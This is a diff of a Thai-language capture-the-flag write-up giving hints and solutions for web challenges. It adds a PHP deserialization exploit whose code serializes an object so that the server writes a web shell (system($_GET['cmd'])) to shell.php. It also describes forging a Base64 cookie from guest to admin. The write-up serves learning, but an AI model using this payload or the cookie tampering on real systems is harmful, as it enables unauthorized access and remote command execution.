@@ -30,7 +30,7 @@ solution
 hint
     - มีอะไรอยู่ใน Cookie หรือเปล่าน้า
 solution
-    - หน้าเว็บของด่านนี้จะแทบไม่มีอะไรเลย แต่เมื่อสังเกตดีๆ จะเห็นว่ามี Cookie ชื่อว่า user อยู่ มีค่าเป็น UmFscGg6Z3Vlc3Q= ซึ่งหากดูจาก format แล้วน่าจะเป็น Base64encoding เมื่อ decode ออกมาจะได้ Ralph:guest จากข้อความหน้าเว็บก็จะเดาได้ว่าต้องเป็น role admin ถึงจะเข้าถึงหน้านี้ได้ โดยให้เปลี่ยนจาก guest > admin ดังนี้ Ralph:guest > Ralph:admin แล้วนำไป Base64encoding และ set Cookie user เมื่อเข้าหน้าเว็บด้วย Cookie ใหม่ก็จะพบกับ flag 
+    - หน้าเว็บของด่านนี้จะแทบไม่มีอะไรเลย แต่เมื่อสังเกตดีๆ จะเห็นว่ามี Cookie ชื่อว่า user อยู่ มีค่าเป็น UmFscGg6Z3Vlc3Q= ซึ่งหากดูจาก format แล้วน่าจะเป็น Base64 encoding เมื่อ decode ออกมาจะได้ Ralph:guest จากข้อความหน้าเว็บก็จะเดาได้ว่าต้องเป็น role admin ถึงจะเข้าถึงหน้านี้ได้ โดยให้เปลี่ยนจาก guest > admin ดังนี้ Ralph:guest > Ralph:admin แล้วนำไป Base64 encoding และ set Cookie user เมื่อเข้าหน้าเว็บด้วย Cookie ใหม่ก็จะพบกับ flag 
 
 
 #ch6 - 30pt
@@ -97,6 +97,25 @@ solution
 
 #ch13 175pt
 hint
-    - อะไรอยู่ข้างใน redeem code ,มันเขียนไฟล์ได้ ?! (keyword: php deserialization)
+    - อะไรอยู่ข้างใน Redeem Code ,มันเขียนไฟล์ได้ ?! (keyword: php deserialization)
 solution
-    - 
+    - เมื่อเข้ามาถึงหน้านี้จะพบว่า เป็นหน้าที่ใช้สำหรับ Submit Redeem Code และมีตัวอย่างของโค้ดอยู่เมื่อใส่ไป จะเห็นว่ามี ลิสต์ I003 เพิ่มขึ้น เมื่อกดที่ลิ้ง จะพบว่าเป็นไฟล์ text ที่มีข้อมูลของ Item เก็บอยู่ ย้อนกลับมาส่วนของ Code เมื่อนำไป Base64 decode จะได้
+        "O:4:"Item":4:{s:2:"id";s:4:"I003";s:4:"name";s:12:"Lunatic Card";s:11:"description";s:45:"LUK + 1, Critical Rate + 1, Perfect Dodge + 1";s:5:"price";i:10;}"
+    ซึ่งเป็น string ของ php serialization โจทย์ข้อนี้จะทำการ Base64 decode และ unserialize และเขียน ข้อมูลของ object นั้นๆ ลงเป็นไฟล์ เมื่อรู้แบบนี้แล้วเราจะสามารถทำการ เขียน php shell ลงไปได้ โดยเริ่มจาก เขียนคลาส Item แล้วก็ attribute ข้างในตามโครงสร้าง จากนั้นก็ new object ,serialize(object) และ แสดง Base64 encode ของมันออกมา ดังโค้ดต่อไปนี้
+
+        <?php 
+        // solution
+
+        class Item {
+        public $id = "shell.php";
+        public $name = "<?php system(\$_GET['cmd']); ?>";
+        public $description = "";
+        public $price = "";
+        }
+
+        $obj = new Item;
+        $s = serialize($obj);
+        echo base64_encode($s);
+        ?>
+
+    และจะได้ Redeem Code ออกมา เมื่อเอาไป redeem จะได้ไฟล์ php shell และ สามารถรัน os command ได้ ทำให้อ่าน ค่า flag ออกมาได้
